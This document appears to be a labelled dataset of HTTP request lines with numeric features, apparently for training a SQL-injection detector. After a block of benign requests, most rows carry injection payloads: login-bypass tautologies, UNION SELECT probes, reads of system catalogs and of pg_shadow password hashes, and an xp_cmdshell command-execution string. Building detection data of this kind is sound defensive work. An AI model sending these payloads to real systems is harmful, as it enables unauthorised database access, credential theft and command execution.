13,1,200,6655,7,0,1,1,0,GET  HTTP/1.1
13,1,200,5368,7,0,1,1,0,GET  HTTP/1.1
13,1,200,6666,7,0,1,1,0,GET  HTTP/1.1
13,1,200,7727,7,0,1,1,0,GET  HTTP/1.1
13,1,200,5489,7,0,1,1,0,GET  HTTP/1.1
13,1,200,2191,7,0,1,1,0,GET  HTTP/1.1
13,1,200,7725,7,0,1,1,0,GET  HTTP/1.1
13,1,200,3546,7,0,1,1,0,GET  HTTP/1.1
13,1,200,7512,7,0,1,1,0,GET  HTTP/1.1
13,1,200,3741,7,0,1,1,0,GET  HTTP/1.1
13,1,200,6488,7,0,1,1,0,GET  HTTP/1.1
13,1,200,4786,7,0,1,1,0,GET  HTTP/1.1
13,1,200,6767,7,0,1,1,0,GET  HTTP/1.1
13,1,200,3103,7,0,1,1,0,GET  HTTP/1.1
13,1,200,7484,7,0,1,1,0,GET  HTTP/1.1
13,1,200,4179,7,0,1,1,0,GET  HTTP/1.1
13,1,200,1320,7,0,1,1,0,GET  HTTP/1.1
13,1,200,3896,7,0,1,1,0,GET  HTTP/1.1
13,1,200,6502,7,0,1,1,0,GET  HTTP/1.1
13,1,200,2831,7,0,1,1,0,GET  HTTP/1.1
13,1,200,6817,7,0,1,1,0,GET  HTTP/1.1
13,1,200,4821,7,0,1,1,0,GET  HTTP/1.1
13,1,200,2244,7,0,1,1,0,GET  HTTP/1.1
13,1,200,6050,7,0,1,1,0,GET  HTTP/1.1
13,1,200,4887,7,0,1,1,0,GET  HTTP/1.1
13,1,200,4527,7,0,1,1,0,GET  HTTP/1.1
13,1,200,1856,7,0,1,1,0,GET  HTTP/1.1
13,1,200,6375,7,0,1,1,0,GET  HTTP/1.1
13,1,200,7462,7,0,1,1,0,GET  HTTP/1.1
13,1,200,5647,7,0,1,1,0,GET  HTTP/1.1
13,1,200,3795,7,0,1,1,0,GET  HTTP/1.1
13,1,200,1620,7,0,1,1,0,GET  HTTP/1.1
13,1,200,5107,7,0,1,1,0,GET  HTTP/1.1
13,1,200,1417,7,0,1,1,0,GET  HTTP/1.1
13,1,200,3841,7,0,1,1,0,GET  HTTP/1.1
13,1,200,5706,7,0,1,1,0,GET  HTTP/1.1
13,1,200,2096,7,0,1,1,0,GET  HTTP/1.1
13,1,200,5320,7,0,1,1,0,GET  HTTP/1.1
13,1,200,5331,7,0,1,1,0,GET  HTTP/1.1
13,1,200,6659,7,0,1,1,0,GET  HTTP/1.1
13,1,200,6952,7,0,1,1,0,GET  HTTP/1.1
13,1,200,1040,7,0,1,1,0,GET  HTTP/1.1
13,1,200,4642,7,0,1,1,0,GET  HTTP/1.1
13,1,200,2980,7,0,1,1,0,GET  HTTP/1.1
13,1,200,6470,7,0,1,1,0,GET  HTTP/1.1
13,1,200,6777,7,0,1,1,0,GET  HTTP/1.1
13,1,200,4908,7,0,1,1,0,GET  HTTP/1.1
13,1,200,1504,7,0,1,1,0,GET  HTTP/1.1
13,1,200,7091,7,0,1,1,0,GET  HTTP/1.1
13,1,200,3926,7,0,1,1,0,GET  HTTP/1.1
13,1,200,5934,7,0,1,1,0,GET  HTTP/1.1
13,1,200,2793,7,0,1,1,0,GET  HTTP/1.1
13,1,200,7251,7,0,1,1,0,GET  HTTP/1.1
13,1,200,3835,7,0,1,1,0,GET  HTTP/1.1
13,1,200,5039,7,0,1,1,0,GET  HTTP/1.1
13,1,200,6639,7,0,1,1,0,GET  HTTP/1.1
13,1,200,3675,7,0,1,1,0,GET  HTTP/1.1
13,1,200,3603,7,0,1,1,0,GET  HTTP/1.1
13,1,200,4737,7,0,1,1,0,GET  HTTP/1.1
13,1,200,4943,7,0,1,1,0,GET  HTTP/1.1
13,1,200,6712,7,0,1,1,0,GET  HTTP/1.1
13,1,200,6731,7,0,1,1,0,GET  HTTP/1.1
13,1,200,3791,7,0,1,1,0,GET  HTTP/1.1
13,1,200,2084,7,0,1,1,0,GET  HTTP/1.1
13,1,200,3449,7,0,1,1,0,GET  HTTP/1.1
13,1,200,6822,7,0,1,1,0,GET  HTTP/1.1
13,1,200,2798,7,0,1,1,0,GET  HTTP/1.1
13,1,200,2172,7,0,1,1,0,GET  HTTP/1.1
13,1,200,1401,7,0,1,1,0,GET  HTTP/1.1
13,1,200,3619,7,0,1,1,0,GET  HTTP/1.1
13,1,200,5862,7,0,1,1,0,GET  HTTP/1.1
13,1,200,7969,7,0,1,1,0,GET  HTTP/1.1
13,1,200,5731,7,0,1,1,0,GET  HTTP/1.1
13,1,200,6710,7,0,1,1,0,GET  HTTP/1.1
13,1,200,4175,7,0,1,1,0,GET  HTTP/1.1
13,1,200,2561,7,0,1,1,0,GET  HTTP/1.1
13,1,200,1760,7,0,1,1,0,GET  HTTP/1.1
13,1,200,3649,7,0,1,1,0,GET  HTTP/1.1
13,1,200,6882,7,0,1,1,0,GET  HTTP/1.1
13,1,200,6509,7,0,1,1,0,GET  HTTP/1.1
13,1,200,7898,7,0,1,1,0,GET  HTTP/1.1
13,1,200,1581,7,0,1,1,0,GET  HTTP/1.1
13,1,200,7914,7,0,1,1,0,GET  HTTP/1.1
13,1,200,4994,7,0,1,1,0,GET  HTTP/1.1
13,1,200,7541,7,0,1,1,0,GET  HTTP/1.1
13,1,200,5921,7,0,1,1,0,GET  HTTP/1.1
13,1,200,7749,7,0,1,1,0,GET  HTTP/1.1
13,1,200,1443,7,0,1,1,0,GET  HTTP/1.1
13,1,200,2020,7,0,1,1,0,GET  HTTP/1.1
13,1,200,6849,7,0,1,1,0,GET  HTTP/1.1
13,1,200,5501,7,0,1,1,0,GET  HTTP/1.1
13,1,200,6687,7,0,1,1,0,GET  HTTP/1.1
13,1,200,3731,7,0,1,1,0,GET  HTTP/1.1
13,1,200,5373,7,0,1,1,0,GET  HTTP/1.1
13,1,200,6419,7,0,1,1,0,GET  HTTP/1.1
13,1,200,4788,7,0,1,1,0,GET  HTTP/1.1
13,1,200,2345,7,0,1,1,0,GET  HTTP/1.1
13,1,200,7798,7,0,1,1,0,GET  HTTP/1.1
13,1,200,7140,7,0,1,1,0,GET  HTTP/1.1
13,1,200,6116,7,0,1,1,0,GET  HTTP/1.1
13,1,200,4175,7,0,1,1,0,GET  HTTP/1.1
13,1,200,5854,7,0,1,1,0,GET  HTTP/1.1
13,1,200,3197,7,0,1,1,0,GET  HTTP/1.1
13,1,200,6712,7,0,1,1,0,GET  HTTP/1.1
13,1,200,1233,7,0,1,1,0,GET  HTTP/1.1
13,1,200,1563,7,0,1,1,0,GET  HTTP/1.1
13,1,200,4079,7,0,1,1,0,GET  HTTP/1.1
13,1,200,3243,7,0,1,1,0,GET  HTTP/1.1
13,1,200,4637,7,0,1,1,0,GET  HTTP/1.1
13,1,200,6881,7,0,1,1,0,GET  HTTP/1.1
13,1,200,3442,7,0,1,1,0,GET  HTTP/1.1
13,1,200,6014,7,0,1,1,0,GET  HTTP/1.1
13,1,200,2431,7,0,1,1,0,GET  HTTP/1.1
13,1,200,6958,7,0,1,1,0,GET  HTTP/1.1
13,1,200,2971,7,0,1,1,0,GET  HTTP/1.1
13,1,200,3554,7,0,1,1,0,GET  HTTP/1.1
13,1,200,1649,7,0,1,1,0,GET  HTTP/1.1
13,1,200,1607,7,0,1,1,0,GET  HTTP/1.1
13,1,200,4253,7,0,1,1,0,GET  HTTP/1.1
13,1,200,4298,7,0,1,1,0,GET  HTTP/1.1
13,1,200,6532,7,0,1,1,0,GET  HTTP/1.1
13,1,200,6146,7,0,1,1,0,GET  HTTP/1.1
51,1,200,4590,7,30,5,1,1,GET ?id=select user from sysibm.sysdummy1; HTTP/1.1
51,1,200,4957,7,30,5,1,1,GET ?id=select user from sysibm.sysdummy1; HTTP/1.1
51,1,200,5867,7,30,5,1,1,GET ?id=select user from sysibm.sysdummy1; HTTP/1.1
51,1,200,5822,7,30,5,1,1,GET ?id=select user from sysibm.sysdummy1; HTTP/1.1
33,1,200,5941,7,11,7,2,1,GET login/?id=' or a=a-- HTTP/1.1
33,1,200,1230,7,11,7,2,1,GET login/?id=' or a=a-- HTTP/1.1
33,1,200,2729,7,11,7,2,1,GET login/?id=' or a=a-- HTTP/1.1
45,1,200,7200,7,25,4,2,1,GET login/?id=select * from sysusers HTTP/1.1
45,1,200,1163,7,25,4,2,1,GET login/?id=select * from sysusers HTTP/1.1
45,1,200,1285,7,25,4,2,1,GET login/?id=select * from sysusers HTTP/1.1
45,1,200,6242,7,25,4,2,1,GET login/?id=select * from sysusers HTTP/1.1
45,1,200,3090,7,25,4,2,1,GET login/?id=select * from sysusers HTTP/1.1
45,1,200,6277,7,25,4,2,1,GET login/?id=select * from sysusers HTTP/1.1
45,1,200,3708,7,25,4,2,1,GET login/?id=select * from sysusers HTTP/1.1
52,1,200,2480,7,29,8,1,1,GET ?id=select current_setting('hba_file'); HTTP/1.1
52,1,200,5615,7,29,8,1,1,GET ?id=select current_setting('hba_file'); HTTP/1.1
52,1,200,1038,7,29,8,1,1,GET ?id=select current_setting('hba_file'); HTTP/1.1
52,1,200,7603,7,29,8,1,1,GET ?id=select current_setting('hba_file'); HTTP/1.1
52,1,200,2947,7,29,8,1,1,GET ?id=select current_setting('hba_file'); HTTP/1.1
52,1,200,5455,7,29,8,1,1,GET ?id=select current_setting('hba_file'); HTTP/1.1
52,1,200,2912,7,29,8,1,1,GET ?id=select current_setting('hba_file'); HTTP/1.1
52,1,200,4364,7,29,8,1,1,GET ?id=select current_setting('hba_file'); HTTP/1.1
25,1,200,5762,7,7,5,2,0,GET login/?id=== HTTP/1.1
25,1,200,6016,7,7,5,2,0,GET login/?id=== HTTP/1.1
25,1,200,2320,7,7,5,2,0,GET login/?id=== HTTP/1.1
65,1,200,4673,7,41,8,2,1,GET login/?id=select current_setting('log_connections'); HTTP/1.1
65,1,200,7609,7,41,8,2,1,GET login/?id=select current_setting('log_connections'); HTTP/1.1
65,1,200,4582,7,41,8,2,1,GET login/?id=select current_setting('log_connections'); HTTP/1.1
65,1,200,4882,7,41,8,2,1,GET login/?id=select current_setting('log_connections'); HTTP/1.1
65,1,200,7775,7,41,8,2,1,GET login/?id=select current_setting('log_connections'); HTTP/1.1
65,1,200,7905,7,41,8,2,1,GET login/?id=select current_setting('log_connections'); HTTP/1.1
65,1,200,3725,7,41,8,2,1,GET login/?id=select current_setting('log_connections'); HTTP/1.1
56,1,200,4204,21,14,8,2,1,GET login/?id=' UNION ALL SELECT 1_ @@version;# HTTP/1.1
56,1,200,1299,21,14,8,2,1,GET login/?id=' UNION ALL SELECT 1_ @@version;# HTTP/1.1
41,1,200,7295,7,20,5,1,1,GET ?id=select * from pg_shadow; HTTP/1.1
41,1,200,1470,7,20,5,1,1,GET ?id=select * from pg_shadow; HTTP/1.1
41,1,200,5112,7,20,5,1,1,GET ?id=select * from pg_shadow; HTTP/1.1
41,1,200,1424,7,20,5,1,1,GET ?id=select * from pg_shadow; HTTP/1.1
41,1,200,6627,7,20,5,1,1,GET ?id=select * from pg_shadow; HTTP/1.1
41,1,200,6199,7,20,5,1,1,GET ?id=select * from pg_shadow; HTTP/1.1
41,1,200,6621,7,20,5,1,1,GET ?id=select * from pg_shadow; HTTP/1.1
41,1,200,3121,7,20,5,1,1,GET ?id=select * from pg_shadow; HTTP/1.1
41,1,200,4943,7,20,5,1,1,GET ?id=select * from pg_shadow; HTTP/1.1
41,1,200,6512,7,20,5,1,1,GET ?id=select * from pg_shadow; HTTP/1.1
41,1,200,2899,7,20,5,1,1,GET ?id=select * from pg_shadow; HTTP/1.1
42,1,200,6016,7,14,11,2,1,GET login/?id=admin') or '1'='1'# HTTP/1.1
42,1,200,7123,7,14,11,2,1,GET login/?id=admin') or '1'='1'# HTTP/1.1
27,1,200,1268,7,7,6,1,1,GET ?id=' and a='a HTTP/1.1
27,1,200,3086,7,7,6,1,1,GET ?id=' and a='a HTTP/1.1
27,1,200,7985,7,7,6,1,1,GET ?id=' and a='a HTTP/1.1
38,1,200,7535,7,15,8,2,1,GET login/?id=' or 'one'='one HTTP/1.1
38,1,200,1015,7,15,8,2,1,GET login/?id=' or 'one'='one HTTP/1.1
38,1,200,7844,7,15,8,2,1,GET login/?id=' or 'one'='one HTTP/1.1
38,1,200,7412,7,15,8,2,1,GET login/?id=' or 'one'='one HTTP/1.1
38,1,200,3074,7,15,8,2,1,GET login/?id=' or 'one'='one HTTP/1.1
38,1,200,6426,7,15,8,2,1,GET login/?id=' or 'one'='one HTTP/1.1
29,1,200,4180,7,8,7,1,1,GET ?id=') or true-- HTTP/1.1
29,1,200,5402,7,8,7,1,1,GET ?id=') or true-- HTTP/1.1
31,1,200,3584,7,12,5,3,1,GET login/?id=admin'/* HTTP/1.1
31,1,200,3506,7,12,5,3,1,GET login/?id=admin'/* HTTP/1.1
25,1,200,2289,7,4,5,1,0,GET ?id= or 1=1# HTTP/1.1
41,1,200,4117,7,14,10,2,1,GET login/?id=admin' or '1'='1'# HTTP/1.1
41,1,200,3796,7,14,10,2,1,GET login/?id=admin' or '1'='1'# HTTP/1.1
41,1,200,6485,7,14,10,2,1,GET login/?id=admin' or '1'='1'# HTTP/1.1
57,1,200,4927,7,35,5,2,1,GET login/?id=select user from sysibm.sysdummy1; HTTP/1.1
57,1,200,2212,7,35,5,2,1,GET login/?id=select user from sysibm.sysdummy1; HTTP/1.1
57,1,200,6136,7,35,5,2,1,GET login/?id=select user from sysibm.sysdummy1; HTTP/1.1
57,1,200,6511,7,35,5,2,1,GET login/?id=select user from sysibm.sysdummy1; HTTP/1.1
57,1,200,7160,7,35,5,2,1,GET login/?id=select user from sysibm.sysdummy1; HTTP/1.1
57,1,200,3790,7,35,5,2,1,GET login/?id=select user from sysibm.sysdummy1; HTTP/1.1
24,1,200,4278,7,4,4,1,0,GET ?id= or 1=1 HTTP/1.1
24,1,200,5956,7,4,4,1,0,GET ?id= or 1=1 HTTP/1.1
24,1,200,1717,7,4,4,1,0,GET ?id= or 1=1 HTTP/1.1
24,1,200,2728,7,4,4,1,0,GET ?id= or 1=1 HTTP/1.1
30,1,200,5608,7,6,10,1,1,GET ?id=') or ('x'='x HTTP/1.1
30,1,200,4863,7,6,10,1,1,GET ?id=') or ('x'='x HTTP/1.1
30,1,200,3199,7,6,10,1,1,GET ?id=') or ('x'='x HTTP/1.1
26,1,200,3512,7,8,5,1,1,GET ?id=or true-- HTTP/1.1
26,1,200,5489,7,8,5,1,1,GET ?id=or true-- HTTP/1.1
63,1,200,3623,7,39,8,2,1,GET login/?id=select current_setting('log_statement'); HTTP/1.1
63,1,200,4135,7,39,8,2,1,GET login/?id=select current_setting('log_statement'); HTTP/1.1
63,1,200,2616,7,39,8,2,1,GET login/?id=select current_setting('log_statement'); HTTP/1.1
63,1,200,4719,7,39,8,2,1,GET login/?id=select current_setting('log_statement'); HTTP/1.1
63,1,200,5997,7,39,8,2,1,GET login/?id=select current_setting('log_statement'); HTTP/1.1
63,1,200,2720,7,39,8,2,1,GET login/?id=select current_setting('log_statement'); HTTP/1.1
63,1,200,1910,7,39,8,2,1,GET login/?id=select current_setting('log_statement'); HTTP/1.1
57,1,200,7549,7,36,5,2,1,GET login/?id=select name from sysibm.systables; HTTP/1.1
57,1,200,6303,7,36,5,2,1,GET login/?id=select name from sysibm.systables; HTTP/1.1
57,1,200,3886,7,36,5,2,1,GET login/?id=select name from sysibm.systables; HTTP/1.1
57,1,200,7602,7,36,5,2,1,GET login/?id=select name from sysibm.systables; HTTP/1.1
57,1,200,2360,7,36,5,2,1,GET login/?id=select name from sysibm.systables; HTTP/1.1
57,1,200,6376,7,36,5,2,1,GET login/?id=select name from sysibm.systables; HTTP/1.1
57,1,200,2809,7,36,5,2,1,GET login/?id=select name from sysibm.systables; HTTP/1.1
57,1,200,2979,7,36,5,2,1,GET login/?id=select name from sysibm.systables; HTTP/1.1
57,1,200,6861,7,36,5,2,1,GET login/?id=select name from sysibm.systables; HTTP/1.1
57,1,200,1464,7,36,5,2,1,GET login/?id=select name from sysibm.systables; HTTP/1.1
64,1,200,4180,7,41,5,2,1,GET login/?id=select system_user from sysibm.sysdummy1; HTTP/1.1
64,1,200,6633,7,41,5,2,1,GET login/?id=select system_user from sysibm.sysdummy1; HTTP/1.1
64,1,200,2225,7,41,5,2,1,GET login/?id=select system_user from sysibm.sysdummy1; HTTP/1.1
64,1,200,7354,7,41,5,2,1,GET login/?id=select system_user from sysibm.sysdummy1; HTTP/1.1
64,1,200,1561,7,41,5,2,1,GET login/?id=select system_user from sysibm.sysdummy1; HTTP/1.1
28,1,200,6720,7,4,7,1,1,GET ?id=' or 0=0 -- HTTP/1.1
28,1,200,6899,7,4,7,1,1,GET ?id=' or 0=0 -- HTTP/1.1
28,1,200,1061,7,4,7,1,1,GET ?id=' or 0=0 -- HTTP/1.1
28,1,200,6636,7,4,7,1,1,GET ?id=' or 0=0 -- HTTP/1.1
25,1,200,7894,7,4,5,1,1,GET ?id=' or 1=1 HTTP/1.1
51,1,200,4664,7,31,5,1,1,GET ?id=select name from sysibm.systables; HTTP/1.1
51,1,200,7547,7,31,5,1,1,GET ?id=select name from sysibm.systables; HTTP/1.1
51,1,200,3081,7,31,5,1,1,GET ?id=select name from sysibm.systables; HTTP/1.1
51,1,200,3355,7,31,5,1,1,GET ?id=select name from sysibm.systables; HTTP/1.1
51,1,200,5270,7,31,5,1,1,GET ?id=select name from sysibm.systables; HTTP/1.1
51,1,200,4315,7,31,5,1,1,GET ?id=select name from sysibm.systables; HTTP/1.1
51,1,200,4890,7,31,5,1,1,GET ?id=select name from sysibm.systables; HTTP/1.1
51,1,200,7981,7,31,5,1,1,GET ?id=select name from sysibm.systables; HTTP/1.1
51,1,200,4584,7,31,5,1,1,GET ?id=select name from sysibm.systables; HTTP/1.1
51,1,200,1500,7,31,5,1,1,GET ?id=select name from sysibm.systables; HTTP/1.1
51,1,200,2252,7,31,5,1,1,GET ?id=select name from sysibm.systables; HTTP/1.1
28,1,200,6502,7,4,7,1,1,GET ?id=' or '1¡¬='1 HTTP/1.1
87,1,200,6693,24,20,8,2,1,GET login/?id=' AND 1=0 UNION ALL SELECT ''_ '81dc9bdb52d04dc20036dbd8313ed055 HTTP/1.1
31,1,200,4575,7,4,11,1,1,GET ?id=') or '1'='1'# HTTP/1.1
31,1,200,6641,7,4,11,1,1,GET ?id=') or '1'='1'# HTTP/1.1
81,1,200,4462,7,58,5,1,1,GET ?id=select versionnumber_ version_timestamp from sysibm.sysversions; HTTP/1.1
81,1,200,1380,7,58,5,1,1,GET ?id=select versionnumber_ version_timestamp from sysibm.sysversions; HTTP/1.1
81,1,200,3439,7,58,5,1,1,GET ?id=select versionnumber_ version_timestamp from sysibm.sysversions; HTTP/1.1
81,1,200,4132,7,58,5,1,1,GET ?id=select versionnumber_ version_timestamp from sysibm.sysversions; HTTP/1.1
81,1,200,2797,7,58,5,1,1,GET ?id=select versionnumber_ version_timestamp from sysibm.sysversions; HTTP/1.1
27,1,200,7195,7,6,7,1,1,GET ?id=' or a=a-- HTTP/1.1
27,1,200,6016,7,6,7,1,1,GET ?id=' or a=a-- HTTP/1.1
27,1,200,3125,7,6,7,1,1,GET ?id=' or a=a-- HTTP/1.1
31,1,200,5980,7,9,5,3,2,GET login/?id=or 1=1/* HTTP/1.1
31,1,200,3293,7,9,5,3,2,GET login/?id=or 1=1/* HTTP/1.1
31,1,200,4884,7,9,5,3,2,GET login/?id=or 1=1/* HTTP/1.1
34,1,200,1626,7,11,8,2,1,GET login/?id=' or 'x'='x HTTP/1.1
34,1,200,1095,7,11,8,2,1,GET login/?id=' or 'x'='x HTTP/1.1
34,1,200,6243,7,11,8,2,1,GET login/?id=' or 'x'='x HTTP/1.1
20,1,200,6029,7,2,6,1,1,GET ?id='-' HTTP/1.1
20,1,200,1560,7,2,6,1,1,GET ?id='-' HTTP/1.1
59,1,200,5534,7,35,7,2,2,GET login/?id=exec master..xp_cmdshell 'net users' HTTP/1.1
59,1,200,6553,7,35,7,2,2,GET login/?id=exec master..xp_cmdshell 'net users' HTTP/1.1
59,1,200,7639,7,35,7,2,2,GET login/?id=exec master..xp_cmdshell 'net users' HTTP/1.1
59,1,200,7058,7,35,7,2,2,GET login/?id=exec master..xp_cmdshell 'net users' HTTP/1.1
59,1,200,1315,7,35,7,2,2,GET login/?id=exec master..xp_cmdshell 'net users' HTTP/1.1
59,1,200,2457,7,35,7,2,2,GET login/?id=exec master..xp_cmdshell 'net users' HTTP/1.1
59,1,200,7061,7,35,7,2,2,GET login/?id=exec master..xp_cmdshell 'net users' HTTP/1.1
59,1,200,7502,7,35,7,2,2,GET login/?id=exec master..xp_cmdshell 'net users' HTTP/1.1
59,1,200,2331,7,35,7,2,2,GET login/?id=exec master..xp_cmdshell 'net users' HTTP/1.1
39,1,200,1346,7,20,4,1,1,GET ?id=select * from sysusers HTTP/1.1
39,1,200,4418,7,20,4,1,1,GET ?id=select * from sysusers HTTP/1.1
39,1,200,6864,7,20,4,1,1,GET ?id=select * from sysusers HTTP/1.1
39,1,200,1071,7,20,4,1,1,GET ?id=select * from sysusers HTTP/1.1
39,1,200,2283,7,20,4,1,1,GET ?id=select * from sysusers HTTP/1.1
39,1,200,2305,7,20,4,1,1,GET ?id=select * from sysusers HTTP/1.1
39,1,200,5411,7,20,4,1,1,GET ?id=select * from sysusers HTTP/1.1
39,1,200,6567,7,20,4,1,1,GET ?id=select * from sysusers HTTP/1.1
50,1,200,4221,7,15,13,1,1,GET ?id=') or ('a'='a and hi") or ("a"="a HTTP/1.1
50,1,200,4228,7,15,13,1,1,GET ?id=') or ('a'='a and hi") or ("a"="a HTTP/1.1
50,1,200,5417,7,15,13,1,1,GET ?id=') or ('a'='a and hi") or ("a"="a HTTP/1.1
43,1,200,7106,7,14,11,3,1,GET login/?id=admin') or '1'='1'/* HTTP/1.1
43,1,200,6885,7,14,11,3,1,GET login/?id=admin') or '1'='1'/* HTTP/1.1
43,1,200,3545,7,14,11,3,1,GET login/?id=admin') or '1'='1'/* HTTP/1.1
43,1,200,7055,7,14,11,3,1,GET login/?id=admin') or '1'='1'/* HTTP/1.1
31,1,200,4327,7,10,4,2,0,GET login/?id= and 1=1 HTTP/1.1
31,1,200,6411,7,10,4,2,0,GET login/?id= and 1=1 HTTP/1.1
31,1,200,2198,7,10,4,2,0,GET login/?id= and 1=1 HTTP/1.1
62,1,200,3750,7,38,8,2,1,GET login/?id=select current_setting('virtual_host'); HTTP/1.1
62,1,200,2963,7,38,8,2,1,GET login/?id=select current_setting('virtual_host'); HTTP/1.1
62,1,200,3347,7,38,8,2,1,GET login/?id=select current_setting('virtual_host'); HTTP/1.1
